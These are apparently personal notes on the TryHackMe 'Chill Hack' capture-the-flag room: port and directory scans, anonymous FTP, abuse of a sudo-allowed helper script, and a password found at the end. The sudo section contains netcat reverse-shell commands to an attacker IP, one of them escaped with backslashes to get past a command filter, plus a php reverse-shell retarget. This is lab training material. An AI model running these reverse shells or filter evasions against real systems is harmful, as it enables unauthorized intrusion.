https://tryhackme.com/room/chillhack



#############################
		Cosmin Tibuleac | 07.02.2022
#############################



export IP=10.10.175.82

## nmap:

`nmap -sC -sV -Pn -p- -T4 $IP | tee nmap.log`


## gobuster 

gobuster dir -u $IP --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 


# FTP - Anonymous is allowed.

Logging in anonymously on the FTP server is allowed. 

Found the following file: **note.txt**

The file reads: "***Anurodh told me that there is some filtering on strings being put in the command -- Apaar***"

So, we have two potential usernames here: 
 - Anurodh
 - Appar  



## Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh


echo "sudo nc 10.8.22.238 9001" > /home/apaar/.helpline.sh
echo "nc 10.8.22.238 9001" > /home/apaar/.helpline.sh



## otal 44 drwxr-xr-x 5 apaar apaar 4096 Oct 4 2020 . drwxr-xr-x 5 root root 4096 Oct 3 2020 .. -rw------- 1 apaar apaar 0 Oct 4 2020 .bash_history -rw-r--r-- 1 apaar apaar 220 Oct 3 2020 .bash_logout -rw-r--r-- 1 apaar apaar 3771 Oct 3 2020 .bashrc drwx------ 2 apaar apaar 4096 Oct 3 2020 .cache drwx------ 3 apaar apaar 4096 Oct 3 2020 .gnupg -rwxrwxr-x 1 apaar apaar 286 Oct 4 2020 .helpline.sh -rw-r--r-- 1 apaar apaar 807 Oct 3 2020 .profile drwxr-xr-x 2 apaar apaar 4096 Oct 3 2020 .ssh -rw------- 1 apaar apaar 817 Oct 3 2020 .viminfo -rw-rw---- 1 apaar apaar 46 Oct 4 2020 local.txt


echo " netcat 10.8.22.238 9001 -e /bin/sh" > /home/apaar/helpline.sh

v2: e\ch\o  "" netcat 10.8.22.238 9001 -e /bin/sh" > /home/apaar/helpline.sh


sed /127.0.0.1/10.8.22.238/g php-reverse-shell.php 


Anurodh
!d0ntKn0wmYp@ssw0rd